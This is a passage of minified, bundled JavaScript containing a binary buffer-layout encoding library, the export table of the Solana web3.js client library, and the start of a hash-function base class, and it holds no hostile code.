                    }
                    makeDestinationObject() {
                        return {}
                    }
                    getSpan(e, t) {
                        if (0 > this.span) throw new RangeError("indeterminate span");
                        return this.span
                    }
                    replicate(e) {
                        const t = Object.create(this.constructor.prototype);
                        return Object.assign(t, this), t.property = e, t
                    }
                    fromArray(e) {}
                }

                function a(e, t) {
                    return t.property ? e + "[" + t.property + "]" : e
                }
                class u extends s {
                    isCount() {
                        throw new Error("ExternalLayout is abstract")
                    }
                }
                class c extends u {
                    constructor() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 1,
                            t = arguments.length > 1 ? arguments[1] : void 0;
                        if (!Number.isInteger(e) || 0 >= e) throw new TypeError("elementSpan must be a (positive) integer");
                        super(-1, t), this.elementSpan = e
                    }
                    isCount() {
                        return !0
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        i(e);
                        const n = e.length - t;
                        return Math.floor(n / this.elementSpan)
                    }
                    encode(e, t, n) {
                        return 0
                    }
                }
                class l extends u {
                    constructor(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
                            n = arguments.length > 2 ? arguments[2] : void 0;
                        if (!(e instanceof s)) throw new TypeError("layout must be a Layout");
                        if (!Number.isInteger(t)) throw new TypeError("offset must be integer or undefined");
                        super(e.span, n || e.property), this.layout = e, this.offset = t
                    }
                    isCount() {
                        return this.layout instanceof f || this.layout instanceof h
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return this.layout.decode(e, t + this.offset)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return this.layout.encode(e, t, n + this.offset)
                    }
                }
                class f extends s {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readUIntLE(t, this.span)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeUIntLE(e, n, this.span), this.span
                    }
                }
                class h extends s {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readUIntBE(t, this.span)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeUIntBE(e, n, this.span), this.span
                    }
                }
                class d extends s {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readIntLE(t, this.span)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeIntLE(e, n, this.span), this.span
                    }
                }
                class p extends s {
                    constructor(e, t) {
                        if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readIntBE(t, this.span)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeIntBE(e, n, this.span), this.span
                    }
                }
                const y = Math.pow(2, 32);

                function g(e) {
                    const t = Math.floor(e / y);
                    return {
                        hi32: t,
                        lo32: e - t * y
                    }
                }

                function m(e, t) {
                    return e * y + t
                }
                class w extends s {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = o(e),
                            r = n.readUInt32LE(t);
                        return m(n.readUInt32LE(t + 4), r)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = g(e),
                            i = o(t);
                        return i.writeUInt32LE(r.lo32, n), i.writeUInt32LE(r.hi32, n + 4), 8
                    }
                }
                class b extends s {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = o(e);
                        return m(n.readUInt32BE(t), n.readUInt32BE(t + 4))
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = g(e),
                            i = o(t);
                        return i.writeUInt32BE(r.hi32, n), i.writeUInt32BE(r.lo32, n + 4), 8
                    }
                }
                class v extends s {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = o(e),
                            r = n.readUInt32LE(t);
                        return m(n.readInt32LE(t + 4), r)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = g(e),
                            i = o(t);
                        return i.writeUInt32LE(r.lo32, n), i.writeInt32LE(r.hi32, n + 4), 8
                    }
                }
                class A extends s {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = o(e);
                        return m(n.readInt32BE(t), n.readUInt32BE(t + 4))
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = g(e),
                            i = o(t);
                        return i.writeInt32BE(r.hi32, n), i.writeUInt32BE(r.lo32, n + 4), 8
                    }
                }
                class k extends s {
                    constructor(e) {
                        super(4, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readFloatLE(t)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeFloatLE(e, n), 4
                    }
                }
                class _ extends s {
                    constructor(e) {
                        super(4, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readFloatBE(t)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeFloatBE(e, n), 4
                    }
                }
                class E extends s {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readDoubleLE(t)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeDoubleLE(e, n), 8
                    }
                }
                class S extends s {
                    constructor(e) {
                        super(8, e)
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return o(e).readDoubleBE(t)
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        return o(t).writeDoubleBE(e, n), 8
                    }
                }
                class I extends s {
                    constructor(e, t, n) {
                        if (!(e instanceof s)) throw new TypeError("elementLayout must be a Layout");
                        if (!(t instanceof u && t.isCount() || Number.isInteger(t) && 0 <= t)) throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");
                        let r = -1;
                        !(t instanceof u) && 0 < e.span && (r = t * e.span), super(r, n), this.elementLayout = e, this.count = t
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        if (0 <= this.span) return this.span;
                        let n = 0,
                            r = this.count;
                        if (r instanceof u && (r = r.decode(e, t)), 0 < this.elementLayout.span) n = r * this.elementLayout.span;
                        else {
                            let i = 0;
                            for (; i < r;) n += this.elementLayout.getSpan(e, t + n), ++i
                        }
                        return n
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = [];
                        let r = 0,
                            i = this.count;
                        for (i instanceof u && (i = i.decode(e, t)); r < i;) n.push(this.elementLayout.decode(e, t)), t += this.elementLayout.getSpan(e, t), r += 1;
                        return n
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = this.elementLayout,
                            i = e.reduce(((e, i) => e + r.encode(i, t, n + e)), 0);
                        return this.count instanceof u && this.count.encode(e.length, t, n), i
                    }
                }
                class x extends s {
                    constructor(e, t, n) {
                        if (!Array.isArray(e) || !e.reduce(((e, t) => e && t instanceof s), !0)) throw new TypeError("fields must be array of Layout instances");
                        "boolean" === typeof t && void 0 === n && (n = t, t = void 0);
                        for (const o of e)
                            if (0 > o.span && void 0 === o.property) throw new Error("fields cannot contain unnamed variable-length layout");
                        let r = -1;
                        try {
                            r = e.reduce(((e, t) => e + t.getSpan()), 0)
                        } catch (i) {}
                        super(r, t), this.fields = e, this.decodePrefixes = !!n
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        if (0 <= this.span) return this.span;
                        let n = 0;
                        try {
                            n = this.fields.reduce(((n, r) => {
                                const i = r.getSpan(e, t);
                                return t += i, n + i
                            }), 0)
                        } catch (r) {
                            throw new RangeError("indeterminate span")
                        }
                        return n
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        i(e);
                        const n = this.makeDestinationObject();
                        for (const r of this.fields)
                            if (void 0 !== r.property && (n[r.property] = r.decode(e, t)), t += r.getSpan(e, t), this.decodePrefixes && e.length === t) break;
                        return n
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = n;
                        let i = 0,
                            o = 0;
                        for (const s of this.fields) {
                            let r = s.span;
                            if (o = 0 < r ? r : 0, void 0 !== s.property) {
                                const i = e[s.property];
                                void 0 !== i && (o = s.encode(i, t, n), 0 > r && (r = s.getSpan(t, n)))
                            }
                            i = n, n += r
                        }
                        return i + o - r
                    }
                    fromArray(e) {
                        const t = this.makeDestinationObject();
                        for (const n of this.fields) void 0 !== n.property && 0 < e.length && (t[n.property] = e.shift());
                        return t
                    }
                    layoutFor(e) {
                        if ("string" !== typeof e) throw new TypeError("property must be string");
                        for (const t of this.fields)
                            if (t.property === e) return t
                    }
                    offsetOf(e) {
                        if ("string" !== typeof e) throw new TypeError("property must be string");
                        let t = 0;
                        for (const n of this.fields) {
                            if (n.property === e) return t;
                            0 > n.span ? t = -1 : 0 <= t && (t += n.span)
                        }
                    }
                }
                class M {
                    constructor(e) {
                        this.property = e
                    }
                    decode(e, t) {
                        throw new Error("UnionDiscriminator is abstract")
                    }
                    encode(e, t, n) {
                        throw new Error("UnionDiscriminator is abstract")
                    }
                }
                class B extends M {
                    constructor(e, t) {
                        if (!(e instanceof u && e.isCount())) throw new TypeError("layout must be an unsigned integer ExternalLayout");
                        super(t || e.property || "variant"), this.layout = e
                    }
                    decode(e, t) {
                        return this.layout.decode(e, t)
                    }
                    encode(e, t, n) {
                        return this.layout.encode(e, t, n)
                    }
                }
                class T extends s {
                    constructor(e, t, n) {
                        let r;
                        if (e instanceof f || e instanceof h) r = new B(new l(e));
                        else if (e instanceof u && e.isCount()) r = new B(e);
                        else {
                            if (!(e instanceof M)) throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");
                            r = e
                        }
                        if (void 0 === t && (t = null), !(null === t || t instanceof s)) throw new TypeError("defaultLayout must be null or a Layout");
                        if (null !== t) {
                            if (0 > t.span) throw new Error("defaultLayout must have constant span");
                            void 0 === t.property && (t = t.replicate("content"))
                        }
                        let i = -1;
                        t && (i = t.span, 0 <= i && (e instanceof f || e instanceof h) && (i += r.layout.span)), super(i, n), this.discriminator = r, this.usesPrefixDiscriminator = e instanceof f || e instanceof h, this.defaultLayout = t, this.registry = {};
                        let o = this.defaultGetSourceVariant.bind(this);
                        this.getSourceVariant = function(e) {
                            return o(e)
                        }, this.configGetSourceVariant = function(e) {
                            o = e.bind(this)
                        }
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        if (0 <= this.span) return this.span;
                        const n = this.getVariant(e, t);
                        if (!n) throw new Error("unable to determine span for unrecognized variant");
                        return n.getSpan(e, t)
                    }
                    defaultGetSourceVariant(e) {
                        if (Object.prototype.hasOwnProperty.call(e, this.discriminator.property)) {
                            if (this.defaultLayout && this.defaultLayout.property && Object.prototype.hasOwnProperty.call(e, this.defaultLayout.property)) return;
                            const t = this.registry[e[this.discriminator.property]];
                            if (t && (!t.layout || t.property && Object.prototype.hasOwnProperty.call(e, t.property))) return t
                        } else
                            for (const t in this.registry) {
                                const n = this.registry[t];
                                if (n.property && Object.prototype.hasOwnProperty.call(e, n.property)) return n
                            }
                        throw new Error("unable to infer src variant")
                    }
                    decode(e) {
                        let t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const r = this.discriminator,
                            i = r.decode(e, n),
                            o = this.registry[i];
                        if (void 0 === o) {
                            const o = this.defaultLayout;
                            let s = 0;
                            this.usesPrefixDiscriminator && (s = r.layout.span), t = this.makeDestinationObject(), t[r.property] = i, t[o.property] = o.decode(e, n + s)
                        } else t = o.decode(e, n);
                        return t
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = this.getSourceVariant(e);
                        if (void 0 === r) {
                            const r = this.discriminator,
                                i = this.defaultLayout;
                            let o = 0;
                            return this.usesPrefixDiscriminator && (o = r.layout.span), r.encode(e[r.property], t, n), o + i.encode(e[i.property], t, n + o)
                        }
                        return r.encode(e, t, n)
                    }
                    addVariant(e, t, n) {
                        const r = new O(this, e, t, n);
                        return this.registry[e] = r, r
                    }
                    getVariant(e) {
                        let t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return t = e instanceof Uint8Array ? this.discriminator.decode(e, n) : e, this.registry[t]
                    }
                }
                class O extends s {
                    constructor(e, t, n, r) {
                        if (!(e instanceof T)) throw new TypeError("union must be a Union");
                        if (!Number.isInteger(t) || 0 > t) throw new TypeError("variant must be a (non-negative) integer");
                        if ("string" === typeof n && void 0 === r && (r = n, n = null), n) {
                            if (!(n instanceof s)) throw new TypeError("layout must be a Layout");
                            if (null !== e.defaultLayout && 0 <= n.span && n.span > e.defaultLayout.span) throw new Error("variant span exceeds span of containing union");
                            if ("string" !== typeof r) throw new TypeError("variant must have a String property")
                        }
                        let i = e.span;
                        0 > e.span && (i = n ? n.span : 0, 0 <= i && e.usesPrefixDiscriminator && (i += e.discriminator.layout.span)), super(i, r), this.union = e, this.variant = t, this.layout = n || null
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        if (0 <= this.span) return this.span;
                        let n = 0;
                        this.union.usesPrefixDiscriminator && (n = this.union.discriminator.layout.span);
                        let r = 0;
                        return this.layout && (r = this.layout.getSpan(e, t + n)), n + r
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = this.makeDestinationObject();
                        if (this !== this.union.getVariant(e, t)) throw new Error("variant mismatch");
                        let r = 0;
                        return this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout ? n[this.property] = this.layout.decode(e, t + r) : this.property ? n[this.property] = !0 : this.union.usesPrefixDiscriminator && (n[this.union.discriminator.property] = this.variant), n
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0,
                            r = 0;
                        if (this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout && !Object.prototype.hasOwnProperty.call(e, this.property)) throw new TypeError("variant lacks property " + this.property);
                        this.union.discriminator.encode(this.variant, t, n);
                        let i = r;
                        if (this.layout && (this.layout.encode(e[this.property], t, n + r), i += this.layout.getSpan(t, n + r), 0 <= this.union.span && i > this.union.span)) throw new Error("encoded variant overruns containing union");
                        return i
                    }
                    fromArray(e) {
                        if (this.layout) return this.layout.fromArray(e)
                    }
                }

                function C(e) {
                    return 0 > e && (e += 4294967296), e
                }
                class P extends s {
                    constructor(e, t, n) {
                        if (!(e instanceof f || e instanceof h)) throw new TypeError("word must be a UInt or UIntBE layout");
                        if ("string" === typeof t && void 0 === n && (n = t, t = !1), 4 < e.span) throw new RangeError("word cannot exceed 32 bits");
                        super(e.span, n), this.word = e, this.msb = !!t, this.fields = [];
                        let r = 0;
                        this._packedSetValue = function(e) {
                            return r = C(e), this
                        }, this._packedGetValue = function() {
                            return r
                        }
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = this.makeDestinationObject(),
                            r = this.word.decode(e, t);
                        this._packedSetValue(r);
                        for (const i of this.fields) void 0 !== i.property && (n[i.property] = i.decode(e));
                        return n
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        const r = this.word.decode(t, n);
                        this._packedSetValue(r);
                        for (const i of this.fields)
                            if (void 0 !== i.property) {
                                const t = e[i.property];
                                void 0 !== t && i.encode(t)
                            }
                        return this.word.encode(this._packedGetValue(), t, n)
                    }
                    addField(e, t) {
                        const n = new L(this, e, t);
                        return this.fields.push(n), n
                    }
                    addBoolean(e) {
                        const t = new N(this, e);
                        return this.fields.push(t), t
                    }
                    fieldFor(e) {
                        if ("string" !== typeof e) throw new TypeError("property must be string");
                        for (const t of this.fields)
                            if (t.property === e) return t
                    }
                }
                class L {
                    constructor(e, t, n) {
                        if (!(e instanceof P)) throw new TypeError("container must be a BitStructure");
                        if (!Number.isInteger(t) || 0 >= t) throw new TypeError("bits must be positive integer");
                        const r = 8 * e.span,
                            i = e.fields.reduce(((e, t) => e + t.bits), 0);
                        if (t + i > r) throw new Error("bits too long for span remainder (" + (r - i) + " of " + r + " remain)");
                        this.container = e, this.bits = t, this.valueMask = (1 << t) - 1, 32 === t && (this.valueMask = 4294967295), this.start = i, this.container.msb && (this.start = r - i - t), this.wordMask = C(this.valueMask << this.start), this.property = n
                    }
                    decode(e, t) {
                        return C(this.container._packedGetValue() & this.wordMask) >>> this.start
                    }
                    encode(e) {
                        if ("number" !== typeof e || !Number.isInteger(e) || e !== C(e & this.valueMask)) throw new TypeError(a("BitField.encode", this) + " value must be integer not exceeding " + this.valueMask);
                        const t = this.container._packedGetValue(),
                            n = C(e << this.start);
                        this.container._packedSetValue(C(t & ~this.wordMask) | n)
                    }
                }
                class N extends L {
                    constructor(e, t) {
                        super(e, 1, t)
                    }
                    decode(e, t) {
                        return !!super.decode(e, t)
                    }
                    encode(e) {
                        "boolean" === typeof e && (e = +e), super.encode(e)
                    }
                }
                class R extends s {
                    constructor(e, t) {
                        if (!(e instanceof u && e.isCount() || Number.isInteger(e) && 0 <= e)) throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");
                        let n = -1;
                        e instanceof u || (n = e), super(n, t), this.length = e
                    }
                    getSpan(e, t) {
                        let n = this.span;
                        return 0 > n && (n = this.length.decode(e, t)), n
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
                            n = this.span;
                        return 0 > n && (n = this.length.decode(e, t)), o(e).slice(t, t + n)
                    }
                    encode(e, t, n) {
                        let r = this.length;
                        if (this.length instanceof u && (r = e.length), !(e instanceof Uint8Array && r === e.length)) throw new TypeError(a("Blob.encode", this) + " requires (length " + r + ") Uint8Array as src");
                        if (n + r > t.length) throw new RangeError("encoding overruns Uint8Array");
                        const i = o(e);
                        return o(t).write(i.toString("hex"), n, r, "hex"), this.length instanceof u && this.length.encode(r, t, n), r
                    }
                }
                class D extends s {
                    constructor(e) {
                        super(-1, e)
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        i(e);
                        let n = t;
                        for (; n < e.length && 0 !== e[n];) n += 1;
                        return 1 + n - t
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = this.getSpan(e, t);
                        return o(e).slice(t, t + n - 1).toString("utf-8")
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        "string" !== typeof e && (e = String(e));
                        const i = r.Buffer.from(e, "utf8"),
                            s = i.length;
                        if (n + s > t.length) throw new RangeError("encoding overruns Buffer");
                        const a = o(t);
                        return i.copy(a, n), a[n + s] = 0, s + 1
                    }
                }
                class z extends s {
                    constructor(e, t) {
                        if ("string" === typeof e && void 0 === t && (t = e, e = void 0), void 0 === e) e = -1;
                        else if (!Number.isInteger(e)) throw new TypeError("maxSpan must be an integer");
                        super(-1, t), this.maxSpan = e
                    }
                    getSpan(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        return i(e), e.length - t
                    }
                    decode(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                        const n = this.getSpan(e, t);
                        if (0 <= this.maxSpan && this.maxSpan < n) throw new RangeError("text length exceeds maxSpan");
                        return o(e).slice(t, t + n).toString("utf-8")
                    }
                    encode(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        "string" !== typeof e && (e = String(e));
                        const i = r.Buffer.from(e, "utf8"),
                            s = i.length;
                        if (0 <= this.maxSpan && this.maxSpan < s) throw new RangeError("text length exceeds maxSpan");
                        if (n + s > t.length) throw new RangeError("encoding overruns Buffer");
                        return i.copy(o(t), n), s
                    }
                }
                class U extends s {
                    constructor(e, t) {
                        super(0, t), this.value = e
                    }
                    decode(e, t) {
                        return this.value
                    }
                    encode(e, t, n) {
                        return 0
                    }
                }
                t.cv = (e, t, n) => new l(e, t, n), t.u8 = e => new f(1, e), t.KB = e => new f(2, e), t.Jq = e => new f(4, e), t._O = e => new w(e), t.gM = e => new v(e), t.n_ = (e, t, n) => new x(e, t, n), t.A9 = (e, t, n) => new I(e, t, n), t.Ik = (e, t) => new R(e, t)
            },
            9679: (e, t, n) => {
                "use strict";
                n.r(t), n.d(t, {
                    Account: () => Kn,
                    AddressLookupTableAccount: () => Jr,
                    AddressLookupTableInstruction: () => No,
                    AddressLookupTableProgram: () => Ro,
                    Authorized: () => Qo,
                    BLOCKHASH_CACHE_TIMEOUT_MS: () => ii,
                    BPF_LOADER_DEPRECATED_PROGRAM_ID: () => qn,
                    BPF_LOADER_PROGRAM_ID: () => Ur,
                    BpfLoader: () => jr,
                    COMPUTE_BUDGET_INSTRUCTION_LAYOUTS: () => zo,
                    ComputeBudgetInstruction: () => Do,
                    ComputeBudgetProgram: () => Uo,
                    Connection: () => Co,
                    Ed25519Program: () => Fo,
                    Enum: () => zn,
                    EpochSchedule: () => Vr,
                    FeeCalculatorLayout: () => Mr,
                    Keypair: () => Po,
                    LAMPORTS_PER_SOL: () => gs,
                    LOOKUP_TABLE_INSTRUCTION_LAYOUTS: () => Lo,
                    Loader: () => zr,
                    Lockup: () => Go,
                    MAX_SEED_LENGTH: () => jn,
                    Message: () => sr,
                    MessageAccountKeys: () => Jn,
                    MessageV0: () => ar,
                    NONCE_ACCOUNT_LENGTH: () => Tr,
                    NonceAccount: () => Or,
                    PACKET_DATA_SIZE: () => Vn,
                    PUBLIC_KEY_LENGTH: () => Fn,
                    PublicKey: () => Wn,
                    SIGNATURE_LENGTH_IN_BYTES: () => Gn,
                    SOLANA_SCHEMA: () => Un,
                    STAKE_CONFIG_ID: () => Vo,
                    STAKE_INSTRUCTION_LAYOUTS: () => Zo,
                    SYSTEM_INSTRUCTION_LAYOUTS: () => Nr,
                    SYSVAR_CLOCK_PUBKEY: () => yr,
                    SYSVAR_EPOCH_SCHEDULE_PUBKEY: () => gr,
                    SYSVAR_INSTRUCTIONS_PUBKEY: () => mr,
                    SYSVAR_RECENT_BLOCKHASHES_PUBKEY: () => wr,
                    SYSVAR_RENT_PUBKEY: () => br,
                    SYSVAR_REWARDS_PUBKEY: () => vr,
                    SYSVAR_SLOT_HASHES_PUBKEY: () => Ar,
                    SYSVAR_SLOT_HISTORY_PUBKEY: () => kr,
                    SYSVAR_STAKE_HISTORY_PUBKEY: () => _r,
                    Secp256k1Program: () => qo,
                    SendTransactionError: () => Qr,
                    SolanaJSONRPCError: () => Yr,
                    SolanaJSONRPCErrorCode: () => Gr,
                    StakeAuthorizationLayout: () => Jo,
                    StakeInstruction: () => Yo,
                    StakeProgram: () => Xo,
                    Struct: () => Dn,
                    SystemInstruction: () => Lr,
                    SystemProgram: () => Rr,
                    Transaction: () => hr,
                    TransactionExpiredBlockheightExceededError: () => Yn,
                    TransactionExpiredTimeoutError: () => Zn,
                    TransactionInstruction: () => fr,
                    TransactionMessage: () => dr,
                    TransactionStatus: () => cr,
                    VALIDATOR_INFO_KEY: () => is,
                    VERSION_PREFIX_MASK: () => Qn,
                    VOTE_PROGRAM_ID: () => as,
                    ValidatorInfo: () => ss,
                    VersionedMessage: () => ur,
                    VersionedTransaction: () => pr,
                    VoteAccount: () => cs,
                    VoteAuthorizationLayout: () => ns,
                    VoteInit: () => $o,
                    VoteInstruction: () => es,
                    VoteProgram: () => rs,
                    clusterApiUrl: () => ps,
                    sendAndConfirmRawTransaction: () => ys,
                    sendAndConfirmTransaction: () => Er
                });
                var r = n(8443);

                function i(e) {
                    if (!Number.isSafeInteger(e) || e < 0) throw new Error(`Wrong positive integer: ${e}`)
                }

                function o(e) {
                    if (!(e instanceof Uint8Array)) throw new TypeError("Expected Uint8Array");
                    for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
                    if (n.length > 0 && !n.includes(e.length)) throw new TypeError(`Expected Uint8Array of length ${n}, not of length=${e.length}`)
                }
                const s = {
                        number: i,
                        bool: function(e) {
                            if ("boolean" !== typeof e) throw new Error(`Expected boolean, not ${e}`)
                        },
                        bytes: o,
                        hash: function(e) {
                            if ("function" !== typeof e || "function" !== typeof e.create) throw new Error("Hash should be wrapped by utils.wrapConstructor");
                            i(e.outputLen), i(e.blockLen)
                        },
                        exists: function(e) {
                            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                            if (e.destroyed) throw new Error("Hash instance has been destroyed");
                            if (t && e.finished) throw new Error("Hash#digest() has already been called")
                        },
                        output: function(e, t) {
                            o(e);
                            const n = t.outputLen;
                            if (e.length < n) throw new Error(`digestInto() expects output buffer of length at least ${n}`)
                        }
                    },
                    a = s,
                    u = ("object" === typeof self && "crypto" in self && self.crypto, e => new DataView(e.buffer, e.byteOffset, e.byteLength)),
                    c = (e, t) => e << 32 - t | e >>> t;
                if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0])) throw new Error("Non little-endian hardware is not supported");
                Array.from({
                    length: 256
                }, ((e, t) => t.toString(16).padStart(2, "0")));

                function l(e) {
                    if ("string" === typeof e && (e = function(e) {
                            if ("string" !== typeof e) throw new TypeError("utf8ToBytes expected string, got " + typeof e);
                            return (new TextEncoder).encode(e)
                        }(e)), !(e instanceof Uint8Array)) throw new TypeError(`Expected input type is Uint8Array (got ${typeof e})`);
                    return e
                }
                class f {
                    clone() {
                        return this._cloneInto()
                    }
                }

                function h(e) {
                    const t = t => e().update(l(t)).digest(),
                        n = e();
                    return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = () => e(), t
                }
                class d extends f {
                    constructor(e, t, n, r) {
                        super(), this.blockLen = e, this.outputLen = t, this.padOffset = n, this.isLE = r, this.finished = !1, this.length = 0, this.pos = 0, this.destroyed = !1, this.buffer = new Uint8Array(e), this.view = u(this.buffer)
                    }
                    update(e) {
                        a.exists(this);
                        const {
                            view: t,
                            buffer: n,
                            blockLen: r
                        } = this, i = (e = l(e)).length;
                        for (let o = 0; o < i;) {
                            const s = Math.min(r - this.pos, i - o);
                            if (s !== r) n.set(e.subarray(o, o + s), this.pos), this.pos += s, o += s, this.pos === r && (this.process(t, 0), this.pos = 0);
                            else {
                                const t = u(e);
                                for (; r <= i - o; o += r) this.process(t, o)
                            }
                        }
                        return this.length += e.length, this.roundClean(), this
                    }
                    digestInto(e) {
                        a.exists(this), a.output(e, this), this.finished = !0;
                        const {
                            buffer: t,
                            view: n,
                            blockLen: r,
                            isLE: i
                        } = this;
                        let {
                            pos: o
                        } = this;
                        t[o++] = 128, this.buffer.subarray(o).fill(0), this.padOffset > r - o && (this.process(n, 0), o = 0);
                        for (let a = o; a < r; a++) t[a] = 0;
                        ! function(e, t, n, r) {
                            if ("function" === typeof e.setBigUint64) return e.setBigUint64(t, n, r);
                            const i = BigInt(32),
                                o = BigInt(4294967295),
                                s = Number(n >> i & o),
                                a = Number(n & o),
                                u = r ? 4 : 0,
                                c = r ? 0 : 4;
                            e.setUint32(t + u, s, r), e.setUint32(t + c, a, r)
                        }(n, r - 8, BigInt(8 * this.length), i), this.process(n, 0);
                        const s = u(e);
                        this.get().forEach(((e, t) => s.setUint32(4 * t, e, i)))
                    }
                    digest() {
                        const {
                            buffer: e,
                            outputLen: t
                        } = this;
                        this.digestInto(e);
                        const n = e.slice(0, t);
                        return this.destroy(), n
                    }
                    _cloneInto(e) {
                        e || (e = new this.constructor), e.set(...this.get());
                        const {
                            blockLen: t,
                            buffer: n,
                            length: r,
                            finished: i,
                            destroyed: o,
                            pos: s
                        } = this;
                        return e.length = r, e.pos = s, e.finished = i, e.destroyed = o, r % t && e.buffer.set(n), e
                    }
                }
